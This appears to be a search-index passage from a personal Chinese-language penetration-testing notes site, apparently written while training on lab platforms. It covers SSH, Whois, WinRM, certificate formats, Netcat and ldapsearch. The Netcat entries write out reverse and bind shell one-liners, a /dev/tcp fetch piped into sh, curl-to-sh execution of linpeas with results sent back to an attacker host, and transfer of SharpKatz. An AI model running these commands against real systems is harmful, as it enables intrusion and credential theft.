<li>CA\u7ed9\u5404\u81ea\u7684\u516c\u94a5\u7b7e\u540d\u4ee5\u9881\u53d1\u5bf9\u5e94\u7684\u8bc1\u4e66\uff08\u670d\u52a1\u5668\u8bc1\u4e66\u3001\u7528\u6237\u8bc1\u4e66\uff09</li> <li>SRV\u548c\u7528\u6237\u4e4b\u540e\u8fd8\u8981\u5b89\u88c5\u8bc1\u4e66\u548cCA\u7b7e\u53d1\u8bc1\u4e66\u7684\u516c\u94a5</li> </ol>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#ssh-tunneling","title":"SSH Tunneling","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#ssh","title":"ssh\u914d\u7f6e","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#sshd","title":"sshd","text":"<p><code>/etc/ssh/sshd_config</code></p> <pre><code># \u5141\u8bb8root\u7528ssh\u767b\u9646\uff1a\n#PermitRootLogin prohibit-password\nPermitRootLogin yes\n\n# \u5141\u8bb8\u516c\u94a5\u8ba4\u8bc1\nPubkeyAuthentication yes\n</code></pre> <p>\u914d\u7f6e\u4fee\u6539\u540e\u91cd\u542fsshd\u670d\u52a1\u3002</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_12","title":"\u8be6\u7ec6\u63a7\u5236","text":"<p>\u5982\u4e0d\u540c\u76ee\u6807\u81ea\u52a8\u7528\u4e0d\u540c\u79d8\u94a5\u8fdb\u884c\u8fde\u63a5\uff1a <pre><code># cat .ssh/config\nHost *\nIdentityFile ~/.ssh/id_rsa\n\nHost 10.10.10.10\uff08\u57df\u540d\u4e5f\u884c\uff0c\u4e5f\u80fd\u7528\u901a\u914d\u7b26\uff09\nIdentityFile ~/.ssh/id_rsa_git\n</code></pre></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/Whois/","title":"Whois","text":"<p>43/TCP</p> <p>IANA \u2014&gt; RIR \u2014&gt; NIR&amp;LIR \u2014&gt; ISP</p> <ul> <li>IANA\uff08Internet Assigned Numbers Authority\uff09\u8d1f\u8d23\u5c06 IP/ASN \u5206\u914d\u7ed9RIR\uff08regional internet registry\uff0c\u533a\u57df\u4e92\u8054\u7f51\u6ce8\u518c\u673a\u6784\uff09\u3002</li> <li>RIR\u5c06\u5176\u5206\u914d\u5230NIR\uff08Nation\uff09\u548cLIR\uff08Local\uff09\u7684\u4e92\u8054\u7f51\u6ce8\u518c\u673a\u6784\uff0c\u7136\u540eNIR/LIR\u5206\u914d\u5230ISP\u3002</li> </ul> <p>\u5168\u74035\u4e2a\u5730\u533a\u5404\u6709RIR\u670d\u52a1\u5668\uff1a</p> <ol> <li>African Network Information Centre (AFRINIC): https://www.afrinic.net/</li> <li>American Registry for Internet Numbers (ARIN): https://www.arin.net/ \uff08\u5317\u7f8e\u3002US\u3001\u52a0\u62ff\u5927\u3001\u52a0\u52d2\u6bd4&amp;\u5317\u5927\u897f\u6d0b\u5c9b\uff09</li> <li>Asia-Pacific Network Information Centre (APNIC): https://www.apnic.net/ \uff08\u4e9a\u592a\u5730\u533a\uff09</li> <li>Latin America and Caribbean Network Information Centre (LACNIC): https://www.lacnic.net/ \uff08\u62c9\u4e01\u7f8e\u6d32&amp;\u4e00\u90e8\u5206\u52a0\u52d2\u6bd4\uff09</li> <li>R\u00e9seaux IP Europ\u00e9ens Network Coordination Centre (RIPE NCC): https://www.ripe.net/ \uff08\u4fc4\u7f57\u65af\u3001\u6b27\u6d32\u3001\u4e2d\u4e1c\u3001\u4e2d\u4e9a/\u5317\u975e\uff09</li> </ol> <p></p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/WinRM/","title":"WinRM","text":"<p>WinRM\uff1a\u5728\u540e\u7aef\uff0c\u5b83\u5229\u7528WMI\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3aWMI\u7684\u57fa\u4e8eHTTP\u7684API\u3002WinRM \u4f7f\u7528 XML \u683c\u5f0f\u7684 SOAP\uff08\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\uff09\u8bf7\u6c42\u901a\u8fc7 HTTP \u8fdb\u884c\u901a\u4fe1\u3002\u6240\u4ee5\u5176ST\u53ef\u80fd\u662f\u8bbf\u95eeHTTP\u7684SPN\u3002</p> <ul> <li>5985/tcp (HTTP)</li> <li>5986/tcp (HTTPS)</li> </ul> <p>\u5982\u679c\u90e8\u7f72\u4e86winrm\u5c31\u4f1a\u670947001\uff1b\u5982\u679c\u8bbe\u7f6e\u5b8c\u6210\u5c31\u67095985 wsman\uff1b\u5982\u679c\u52a0\u4e86ssl\u5c31\u67095986\u3002</p> <p>PowerShell Remoting\u00a0- also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell</p> <p>there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use\u00a0PowerShell Remoting, aka WinRM, to perform file transfer operations.</p> <p>\u6743\u9650\u6761\u4ef63\u90091\uff1a</p> <ul> <li>administrative access</li> <li>a member of the\u00a0<code>Remote Management Users</code>\u00a0group</li> <li>have explicit permissions for PowerShell Remoting in the session configuration</li> </ul> <pre><code># \u786e\u8ba4\u76ee\u6807\u662f\u5426\u5f00\u542fWinRM\nPS C:\\htb&gt; Test-NetConnection -ComputerName DATABASE01 -Port 5985\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n\n# \u5df2\u767b\u5f55\u7684\u8bdd\u4e0d\u9700\u8981\u51ed\u636e\nPS C:\\htb&gt; $Session = New-PSSession -ComputerName DATABASE01\n\nPS C:\\htb&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n## \u53cd\u65b9\u5411\nPS C:\\htb&gt; Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre>","tags":["\u6e17\u900f/\u5229\u7528","IT/Windows","\u6e17\u900f/CPTS","\u6e17\u900f/\u5185\u7f51","IT/\u7f51\u7edc"]},{"location":"Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/","title":"\u516c\u94a5\u8bc1\u4e66","text":"","tags":["IT/\u52a0\u5bc6"]},{"location":"Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/#_1","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u516c\u94a5\u8bc1\u4e66\uff1a\u4e00\u79cd\u6570\u5b57\u8bc1\u4e66\uff0c\u4e13\u95e8\u7528\u4e8e\u5728\u516c\u94a5\u57fa\u7840\u8bbe\u65bd\uff08PKI\uff09\u4e2d\u7ed1\u5b9a\u516c\u94a5\u4e0e\u6301\u6709\u8005\u8eab\u4efd\u4fe1\u606f\u3002X.509\u8bc1\u4e66\u662f\u516c\u94a5\u8bc1\u4e66\u7684\u4e3b\u8981\u6807\u51c6\u3002</p> <p>\u6570\u5b57\u8bc1\u4e66\u7684\u5c42\u7ea7\u7ed3\u6784\u6811\u72b6\u56fe\uff1a <pre><code>\u6570\u5b57\u8bc1\u4e66\n\u251c\u2500\u2500 \u516c\u94a5\u8bc1\u4e66\n\u2502   \u251c\u2500\u2500 X.509 \u8bc1\u4e66\n\u2502   \u2502   \u251c\u2500\u2500 SSL/TLS \u8bc1\u4e66\uff08X.509 \u7684\u4e00\u79cd\u5e94\u7528\uff09\n\u2502   \u2502   \u251c\u2500\u2500 S/MIME \u8bc1\u4e66\uff08\u7528\u4e8e\u7535\u5b50\u90ae\u4ef6\u7684 X.509 \u8bc1\u4e66\uff09\n\u2502   \u2502   \u2514\u2500\u2500 \u4ee3\u7801\u7b7e\u540d\u8bc1\u4e66\uff08\u7528\u4e8e\u9a8c\u8bc1\u8f6f\u4ef6\u7684 X.509 \u8bc1\u4e66\uff09\n\u2502   \u251c\u2500\u2500 OpenPGP \u8bc1\u4e66\uff08\u57fa\u4e8e OpenPGP \u6807\u51c6\uff0c\u7c7b\u4f3c\u4e8e PGP \u8bc1\u4e66\uff09\n\u2502   \u2514\u2500\u2500 SPKI/SDSI \u8bc1\u4e66\uff08\u7b80\u5316\u7684\u516c\u94a5\u57fa\u7840\u8bbe\u65bd\uff09\n\u251c\u2500\u2500 PGP \u8bc1\u4e66\n\u2502   \u2514\u2500\u2500 \uff08\u901a\u5e38\u4e0e OpenPGP \u8bc1\u4e66\u6df7\u7528\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u4fe1\u4efb\u6a21\u578b\uff0c\u66f4\u591a\u4f9d\u8d56 Web of Trust\uff09\n\u2514\u2500\u2500 \u5176\u4ed6\u7c7b\u578b\u7684\u8bc1\u4e66\n    \u251c\u2500\u2500 SSH \u5bc6\u94a5\u5bf9\n    \u251c\u2500\u2500 Kerberos \u7968\u8bc1\n    \u2514\u2500\u2500 FIDO2/WebAuthn \u8ba4\u8bc1\u5bc6\u94a5\n</code></pre></p> <p>\u7531CA\uff08\u8ba4\u8bc1\u5c40\uff09\u751f\u6210\u3002</p> <p>[!note] SSL/TLS\u8bc1\u4e66\u662f\u4e00\u79cd\u7279\u5b9a\u7c7b\u578b\u7684\u516c\u94a5\u8bc1\u4e66\u3002</p>","tags":["IT/\u52a0\u5bc6"]},{"location":"Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/#_2","title":"\u8bc1\u4e66\u6269\u5c55\u540d","text":"<p>X.509 \u8bc1\u4e66\u7684\u5e38\u89c1\u683c\u5f0f\u53ca\u5176\u8bc6\u522b\u65b9\u5f0f\uff1a</p> <ul> <li> <p>PEM\uff08\u9690\u79c1\u589e\u5f3a\u90ae\u4ef6\uff09\u683c\u5f0f\uff1aPEM \u8bc1\u4e66\u4ee5ASCII\u6587\u672c\u7684\u5f62\u5f0f\u8868\u793a\uff0c\u4f7f\u7528Base64\u7f16\u7801\uff0c\u901a\u5e38\u5177\u6709 .pem\u3001.crt\u3001.cer \u6216 .key \u6587\u4ef6\u6269\u5c55\u540d\u3002\u5b83\u4eec\u4ee5\u201c<code>-----BEGIN CERTIFICATE-----</code>\u201d\u5f00\u59cb\uff0c\u4ee5\u201c<code>-----END CERTIFICATE-----</code>\u201d\u7ed3\u675f\u3002</p> </li> <li> <p>DER\uff08Distinguished Encoding Rules\uff09\u683c\u5f0f\uff1aDER \u8bc1\u4e66\u91c7\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\uff0c\u901a\u5e38\u5177\u6709 .der \u6216 .crt \u6587\u4ef6\u6269\u5c55\u540d\u3002\u5b83\u4eec\u65e0\u6cd5\u5728\u6587\u672c\u7f16\u8f91\u5668\u4e2d\u6253\u5f00\uff0c\u9700\u8981\u8f6c\u6362\u4e3a PEM \u683c\u5f0f\u624d\u80fd\u9605\u8bfb\u3002</p> </li> <li> <p>PKCS#12\uff1a\u4e5f\u79f0\u4e3a<code>.PFX</code>\u6587\u4ef6\uff0c\u662f\u4e00\u79cd\u5305\u542b\u79c1\u94a5\u548c\u516c\u94a5\u7684\u6570\u5b57\u8bc1\u4e66\u683c\u5f0f\uff0c\u901a\u5e38\u7528\u4e8e\u5728Windows\u7cfb\u7edf\u4e2d\u5bfc\u51fa\u548c\u5bfc\u5165\u8bc1\u4e66\u3002</p> </li> </ul> <p>\u5728.pfx\u6587\u4ef6\u4e2d\uff0c\u901a\u5e38\u540c\u65f6\u5305\u542b\u4e86\u516c\u94a5\u8bc1\u4e66\u548c\u4e0e\u4e4b\u5173\u8054\u7684\u79c1\u94a5\u3002\u6709\u65f6\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u5c06\u516c\u94a5\u8bc1\u4e66\u548c\u79c1\u94a5\u5206\u5f00\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u5728\u4e0d\u540c\u7684\u573a\u666f\u4e2d\u4f7f\u7528\uff1a</p> <ul> <li>\u8bc1\u4e66\u6587\u4ef6\uff08\u901a\u5e38\u4ee5.crt\u6216.pem\u4e3a\u6269\u5c55\u540d\uff09\u5305\u542b\u516c\u94a5\u8bc1\u4e66\u4fe1\u606f\uff0c\u5b83\u662f\u7528\u6765\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\u7684\uff0c\u5176\u4ed6\u4eba\u53ef\u4ee5\u4f7f\u7528\u8be5\u8bc1\u4e66\u6765\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\uff0c\u5efa\u7acb\u5b89\u5168\u901a\u4fe1\u7b49\u3002<ul> <li><code>openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out certificate.crt</code></li> </ul> </li> <li> <p>\u79c1\u94a5\u6587\u4ef6\uff08\u901a\u5e38\u4ee5.key\u6216.pem\u4e3a\u6269\u5c55\u540d\uff09\u5305\u542b\u4e0e\u8bc1\u4e66\u76f8\u5173\u8054\u7684\u79c1\u94a5\uff0c\u5b83\u662f\u7528\u4e8e\u7b7e\u7f72\u548c\u89e3\u5bc6\u6570\u636e\u7684\uff0c\u56e0\u6b64\u975e\u5e38\u91cd\u8981\u4e14\u9700\u8981\u4fdd\u6301\u5b89\u5168\u3002</p> <ul> <li><code>openssl pkcs12 -in yourfile.pfx -nocerts -nodes -out privatekey.key</code></li> </ul> </li> <li> <p>PKCS#7 \uff1a\u7528\u4e8e\u8bc1\u4e66\u94fe\uff0c\u901a\u5e38\u5177\u6709 .p7b \u6216 .p7c \u6587\u4ef6\u6269\u5c55\u540d\u3002\u5b83\u4eec\u5728\u5355\u4e2a\u6587\u4ef6\u4e2d\u5305\u542b\u591a\u4e2a\u8bc1\u4e66\uff0c\u4ee5\u201c-----BEGIN PKCS7-----\u201d\u5f00\u5934\uff0c\u4ee5\u201c-----END PKCS7-----\u201d\u7ed3\u5c3e\u3002</p> </li> </ul>","tags":["IT/\u52a0\u5bc6"]},{"location":"arsenal/Netcat/","title":"Netcat","text":"","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#nc","title":"nc","text":"<p>Netcat, ncat, or nc</p> <p>The original Netcat was\u00a0released\u00a0by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce\u00a0Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more. https://nmap.org/ncat/</p> <p>\u53ef\u7528 <code>-e</code> \u9009\u9879\uff08\u5728\u670d\u52a1\u7aef\u3001\u5ba2\u6237\u7aef\u90fd\u53ef\u7528\uff09\u3002\u4f46\u4e0d\u5b89\u5168\uff08GAPING_SECURITY_HOLE\uff09\u6240\u4ee5\u73b0\u5728\u5927\u90e8\u5206 <code>netcat</code> \u6ca1\u6709\u8fd9\u4e2a\u529f\u80fd\u4e86\u3002\uff08\u4f46Windows\u4e2dnc64\u6709\u5999\u7528\uff09</p> <p>\u539f\u7406\uff1a\u8fde\u63a5\u6210\u529f\u540e\u6267\u884c\u6307\u5b9a\u547d\u4ee4\u3002\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684stdin\u3001stdout\u548cstderr\u90fd\u91cd\u5b9a\u5411\u5230\u6307\u5b9aTCP/UDP\u7aef\u53e3\u800c\u4e0d\u662f\u9ed8\u8ba4\u63a7\u5236\u53f0\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#_1","title":"\u547d\u540d\u7ba1\u9053\u6d3e\u751f","text":"<p>\u4e24\u79cd\u65b9\u6cd5\uff0c\u53d6\u51b3\u4e8enc\u662f\u5426\u80fd\u7528 <code>-e</code> \u9009\u9879\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#1without-gaping_security_hole","title":"1.Without GAPING_SECURITY_HOLE","text":"<p><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.13.17.96 4444 &gt;/tmp/f</code></p> <ul> <li>sh\u7684 <code>-i</code> \u6307\u201c\u4ea4\u4e92\u6a21\u5f0f\u201d</li> <li>\u5c06\u7ba1\u9053 <code>/tmp/f</code> \u7684\u5185\u5bb9\u4ea4\u7ed9bash\u6267\u884c\uff0c\u7136\u540e\u7ed9nc\u53d1\u9001\u547d\u4ee4\uff0c\u7136\u540e\u7ed3\u679c\u53c8\u4ea4\u7ed9\u7ba1\u9053 <code>/tmp/f</code></li> </ul>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#2with-gaping_security_hole","title":"2.With GAPING_SECURITY_HOLE","text":"<p><code>nc 10.13.17.96 4444 -e /bin/sh</code></p> <p>THM\u4f8b\uff1a - \u53cd\u5f39shell\uff1a<code>mkfifo /tmp/f; nc &lt;\u653b\u51fb\u65b9IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code> - \u7ed1\u5b9ashell\uff1a<code>mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></p> <p>[!note] \u7406\u89e3 \u9996\u5148\uff0c\u5728/tmp/f\u521b\u5efa\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\uff1b\u7136\u540e\uff0c\u5f00\u542fnc\u4fa6\u542c\u5668\uff0c\u5c06\u201c\u4fa6\u542c\u5668\u7684\u8f93\u5165\u201d\u8fde\u5230\u201c\u547d\u540d\u7ba1\u9053\u7684\u8f93\u51fa\u201d\u3002 \u5173\u952e\uff0c\u5c06nc\u4fa6\u542c\u5668\u7684\u8f93\u51fa\uff08\u6211\u4eec\u53d1\u9001\u7684\u547d\u4ee4\uff09\u76f4\u63a5\u901a\u8fc7\u7ba1\u9053\u4f20\u5230sh\uff0c\u5c06 stderr \u8f93\u51fa\u6d41\u53d1\u9001\u5230 stdout\uff0c\u5e76\u5c06 stdout \u672c\u8eab\u53d1\u9001\u5230\u547d\u540d\u7ba1\u9053\u7684\u8f93\u5165\uff0c\u4ece\u800c\u5b8c\u6210\u5faa\u73af\u3002</p> <ul> <li>https://tryhackme.com/room/introtoshells </li> <li>https://www.linuxjournal.com/article/2156</li> <li>https://www.ryotosaito.com/blog/?p=292</li> </ul> <p>\u6210\u529f\u5efa\u7acb\u2014\u2014\u4f46\u662f\u4e0d\u7a33\uff0c\u6bd4\u5982\u65e0\u6cd5\u4f7f\u7528tab\u3001\u65b9\u5411\u952e\u3001ctrl c\u8fd8\u4f1a\u65ad\u6389\u2014\u2014\u79f0\u4e3a\u201cdumb shell\u201d\u3002\u5347\u7ea7\u4e3a\u4ea4\u4e92shell\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#windows","title":"Windows","text":"<p>powershell\u7f16\u7801\u7684\u66ff\u4ee3\u54c1\uff1aPowerCat</p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#_2","title":"\u6587\u4ef6\u4f20\u8f93","text":"<p>\u5982\u679c\u76ee\u6807\u673a\u6ca1\u6709curl\u3001wget\u4f46\u662f\u6709nc\u3002</p> <p>\u4f8b\uff1a\u4ecehostA\u4f20\u9012\u5230hostB\u76ee\u6807\uff08\u4e0b\u9762nc\u6307\u539f\u59cb\u7248\u672c\u7684Netcat\uff09</p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#_3","title":"\u65b9\u6cd5\u4e00","text":"<p>hostB\u76d1\u542c\uff0c\u63a5\u6536\u6587\u4ef6\u5e76\u8f93\u51fa\u3002 <pre><code># hostB:\nnc -lvnp 8000 &gt; SharpKatz.exe\n## ncat\u7684\u8bdd\u8981\u7528 `--recv-only` \u6307\u5b9a\u6587\u4ef6\u4f20\u8f93\u5b8c\u6210\u540e\u5173\u95ed\u8fde\u63a5\nncat -l -p 8000 --recv-only &gt; SharpKatz.exe\n\n# hostA:\n##\u00a0`-q 0`\u00a0\u5c06\u544a\u8bc9 Netcat \u5728\u5b8c\u6210\u540e\u5173\u95ed\u8fde\u63a5\nnc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe\n## ncat\u7684\u8bdd\u7528 `--send-only`\nncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#_4","title":"\u65b9\u6cd5\u4e8c","text":"<p>hostA\u76d1\u542c\uff08\u5728hostB\u963b\u6b62\u5165\u7ad9\u6d41\u91cf\u65f6\u597d\u7528\uff09\uff0c\u5e76\u5c06\u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\uff0c\u7b49\u5f85\u8fde\u63a5\u65b9\u5c06\u5176\u53d6\u8d70\u3002 <pre><code># hostA:\nsudo nc -lvnp 443 -q 0 &lt; SharpKatz.exe\n## ncat\nsudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n\n# hostB:\nnc 192.168.49.128 443 &gt; SharpKatz.exe\n## ncat\nncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#-","title":"\u65b9\u6cd5\u4e09 - \u4f2a\u8bbe\u5907","text":"<p>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file\u00a0/dev/TCP/. Writing to this particular file makes Bash open a TCP connection to\u00a0<code>host:port</code>, and this feature may be used for file transfers.</p> <p>hostA\u76d1\u542c\u3002\u540c\u65b9\u6cd5\u4e8c\uff0c\u4e0d\u8fc7hostB\u6ca1\u6709nc\u7684\u8bdd\u53ef\u4ee5\u7528\u4f2a\u8bbe\u5907\u83b7\u53d6\u6570\u636e\u3002 <pre><code># hostA:\nsudo nc -l -p 443 -q 0 &lt; SharpKatz.exe\n## ncat\nsudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n\n# hostB:\ncat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe\n## \u6216\u8005\u76f4\u63a5\u6267\u884c\ncat &lt; /dev/tcp/192.168.49.128/443 | sh\n</code></pre></p>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#tricks","title":"tricks","text":"","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/Netcat/#_5","title":"\u4f20\u8f93\u679a\u4e3e\u7ed3\u679c","text":"<ul> <li>\u653b\u51fb\u673a\uff0c\u76d1\u542c81\u7aef\u53e3\uff0c\u7b49\u5f85\u76ee\u6807\u673a\u7684\u8fd0\u884c\u7ed3\u679c\u4f20\u56de\uff1a<code>sudo nc -lvnp 81 | tee linpeas.txt</code></li> <li>\u76ee\u6807\u673a\uff0c\u6267\u884c\u811a\u672c\u540enc\u4f20\u8f93\u523081\u7aef\u53e3\uff1a<code>curl &lt;kali-IP&gt;/linpeash.sh | sh |nc &lt;kali-IP&gt; 81</code><ul> <li>\u5305\u542b\u6280\u5de7\uff1a<code>curl &lt;kali-IP&gt;/linpeash.sh |sh</code> \u76f4\u63a5\u6267\u884c\u8fdc\u7a0b\u811a\u672c\u3002\u7c7b\u6bd4powershell-\u4e0b\u8f7d\u811a\u672c\u3001\u5b57\u7b26\u4e32</li> </ul> </li> <li>LinPEAS\u7ed3\u679c\u7684\u9605\u8bfb\u65b9\u5f0f\uff1a<code>less -r linpeas.txt</code></li> </ul>","tags":["\u6e17\u900f/\u5229\u7528","\u6e17\u900f/CPTS","IT/Linux"]},{"location":"arsenal/burpsuite/","title":"Burpsuite","text":""},{"location":"arsenal/enumerate-tools/","title":"Enumerate Tools","text":""},{"location":"arsenal/ldapsearch/","title":"ldapsearch","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_1","title":"\u57fa\u672c\u7528\u6cd5","text":"<p>\u641c\u7d22 LDAP \u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u4f7f\u7528\u5e26\u6709 <code>-x</code> \u9009\u9879\u7684 <code>ldapsearch</code> \u8fdb\u884c\u7b80\u5355\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4f7f\u7528 <code>-b</code> \u6307\u5b9a\u641c\u7d22\u5e93\u3002</p> <p><code>$ ldapsearch -LLL -x -H &lt;ldap_host&gt; -D &lt;bind_dn&gt; -w \"pw\" -b &lt;base_dn&gt; \"(&lt;object_type&gt;)=(&lt;object_value&gt;)\" &lt;optional_attributes&gt;</code></p> <ul> <li>\u4e0a\u8ff0\u6784\u9020\u5f0f\u4f18\u70b9\uff1a\u53ea\u7528\u4fee\u6539\u6700\u540e\u4e24\u90e8\u5206</li> <li><code>()</code> \u62ec\u53f7\u5904\u4e3a\u8fc7\u6ee4\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u4e0d\u8981</li> <li>\u53ef\u5148\u67e5\u5f53\u524d\u8d26\u6237\u7684LDAP\u6811\uff1a<code>(sAMAccountName=username)</code></li> <li><code>optional_attributes</code>\uff1a\u9700\u8981\u8fd4\u56de\u7684\u5c5e\u6027\u3002\u5982\u7528<code>*</code>\u3001<code>dn</code></li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_2","title":"\u4f8b\u5b50","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_3","title":"\u9009\u9879","text":"\u9009\u9879 \u7b80\u4ecb -x \u4f7f\u7528\u7b80\u5355\u8ba4\u8bc1\uff0c\u800c\u4e0d\u662fSASL\u3002\u5982\u679c\u5141\u8bb8\u533f\u540d\u767b\u5f55\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\uff08\u5373\u7701\u7565-D\u548c\u5bc6\u7801\u9009\u9879\uff09 -b \u6709\u9ed8\u8ba4\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u662f\u5565\uff1f<code>base</code>\u7684\u8bdd\u5373ldapsearch#RootDSE -H \u683c\u5f0f\u4e3a\u201cldap://hostname-or-ip:port\u201d- \u7b97-h\u548c-p\u7684\u5408\u5e76\u5982\u679c\u60a8\u4e0d\u76f4\u63a5\u5728 LDAP \u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u641c\u7d22\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u201c-H\u201d\u9009\u9879\u6307\u5b9a\u4e3b\u673a\u5982\u679c\u60a8\u7684\u670d\u52a1\u5668\u63a5\u53d7\u533f\u540d\u8eab\u4efd\u9a8c\u8bc1\uff0c\u60a8\u5c06\u80fd\u591f\u5728\u4e0d\u7ed1\u5b9a\u7ba1\u7406\u5458\u5e10\u6237\u7684\u60c5\u51b5\u4e0b\u6267\u884c LDAP \u641c\u7d22\u67e5\u8be2 -D \u4e0d\u7528\u8fd9\u4e2a\u5c31\u662f\u533f\u540d\u767b\u9646\u3002\u670d\u52a1\u5668\u5c06\u5ffd\u7565\u8be5\u503c\u3002\u7136\u800c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u80fd\u5e0c\u671b\u4ee5\u7ba1\u7406\u5458\u5e10\u6237\u8fd0\u884c LDAP \u67e5\u8be2\uff0c\u4ee5\u4fbf\u5411\u60a8\u663e\u793a\u5176\u4ed6\u4fe1\u606f\u3002\u4e3a\u6b64\uff0c\u60a8\u9700\u8981\u4f7f\u7528 LDAP \u6811\u7684\u7ba1\u7406\u5458\u5e10\u6237\u53d1\u51fa\u7ed1\u5b9a\u8bf7\u6c42\u3002<code>-D</code> \u548c <code>-W</code> \u9009\u9879\u6267\u884c <code>ldapsearch</code> \u67e5\u8be2\uff0c\u4ee5\u4fbf\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u5f53\u4ee5\u7ba1\u7406\u5458\u5e10\u6237\u8fd0\u884c LDAP \u641c\u7d22\u65f6\uff0c\u60a8\u53ef\u80fd\u4f1a\u63a5\u89e6\u5230\u7528\u6237\u52a0\u5bc6\u7684\u5bc6\u7801\uff0c\u56e0\u6b64\u8bf7\u786e\u4fdd\u60a8\u4ee5\u79c1\u5bc6\u65b9\u5f0f\u8fd0\u884c\u67e5\u8be2 -W \u3010\u5bc6\u7801-\u4ea4\u4e92\u5f0f\u3011\u7c21\u6613\u8a8d\u8a3c\u306e\u305f\u3081\u306e\u30d7\u30ed\u30f3\u30d7\u30c8\u3092\u51fa\u3059\uff08\u4e0e <code>-w</code> 2\u90091\uff09 -w 